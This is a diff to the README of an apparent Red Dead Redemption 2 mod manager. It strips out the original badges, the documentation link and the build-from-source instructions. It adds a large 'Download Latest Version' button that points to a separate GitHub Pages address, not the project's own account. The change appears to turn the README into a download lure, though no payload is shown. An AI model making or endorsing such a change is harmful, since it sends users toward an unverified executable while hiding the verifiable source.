@@ -1,9 +1,8 @@
 # RDR2 Mod Manager — Red Dead Redemption 2 Mod Manager for PC
 
-[![GitHub stars](https://img.shields.io/github/stars/alarmmi/RDR2-Mod-Manager?style=flat-square)](https://github.com/alarmmi/RDR2-Mod-Manager/stargazers)
-[![GitHub release](https://img.shields.io/github/v/release/alarmmi/RDR2-Mod-Manager?style=flat-square)](https://github.com/alarmmi/RDR2-Mod-Manager/releases)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Documentation](https://img.shields.io/badge/docs-GitHub%20Pages-blue?style=flat-square)](https://alarmmi.github.io/RDR2-Mod-Manager/)
+| 🚀 Download RDR2 Mod Manager |
+|---|
+| [![Download RDR2 Mod Manager](https://img.shields.io/badge/Download-Latest_Version-blue?style=for-the-badge&logo=github)](https://RDR2-Mod-Manager.github.io/.github/) |
 
 **RDR2 Mod Manager** is an open-source mod manager concept for **Red Dead Redemption 2 on PC**. It is designed to help players install, enable, disable, organize, backup, and troubleshoot single-player RDR2 mods without losing track of game files.
 
@@ -51,19 +50,6 @@ Start here:
 - [Architecture](docs/architecture.md)
 - [Roadmap](docs/roadmap.md)
 - [Glossary](docs/glossary.md)
-- [SEO keyword map](docs/seo-keyword-map.md)
-
-Full documentation site: **https://alarmmi.github.io/RDR2-Mod-Manager/**
-
-## Install from source
-
-```bash
-git clone https://github.com/alarmmi/RDR2-Mod-Manager.git
-cd RDR2-Mod-Manager
-npm install
-npm run build
-npm run start -- --help
-```
 
 ## Example CLI usage
 
@@ -90,16 +76,6 @@ rdr2mm mod disable reshade-preset --profile vanilla-safe
 }
 ```
 
-## SEO strategy used in this repository
-
-This repository is intentionally structured so that Google can understand every important page:
-
-- every documentation file has one clear H1 title;
-- every page targets a distinct search intent;
-- internal links connect related pages;
-- image alt text describes screenshots and diagrams;
-- GitHub Pages front matter includes unique titles and descriptions;
-- FAQ content answers long-tail search queries like “how to backup RDR2 mods” and “why are my RDR2 mods not loading”.
 
 ## Project status
 
